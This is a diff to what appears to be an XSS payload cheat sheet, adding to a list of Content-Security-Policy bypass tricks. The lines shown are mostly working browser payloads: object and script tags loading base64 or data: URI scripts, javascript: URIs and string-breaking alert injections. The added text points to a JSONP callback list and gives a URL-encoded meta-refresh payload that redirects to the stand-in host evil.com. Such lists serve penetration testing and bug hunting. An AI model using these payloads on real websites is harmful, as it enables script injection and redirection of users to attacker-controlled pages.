@@ -105,7 +105,14 @@ E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert
  This will work for script-src self: <br>
  <.object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object.> <br>
  <.object data="javascript:alert(1)".> (firefox) <br>
- <.script src="data:,alert(1)">/<./script>
+ <.script src="data:,alert(1)">/<./script> <br>
+  <br>
+  If a website trusts a 3rd party website on script handling, check this link to see if any JSONP callbacks are possible <br>
+  https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt <br>
+  <br>
+  Check if you can insert a open redirect via meta tag <br>
+  %3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttps://evil.com%22%3E![image](https://user-images.githubusercontent.com/35967437/185359562-32aa1011-c7fa-4ba5-8bf4-ae256f15fc1a.png)
+
 <br>
  <h3> XSS within Variables and scripts</h3>
  '-alert(1)-' (if backslash escaped use the payload below) <br> 
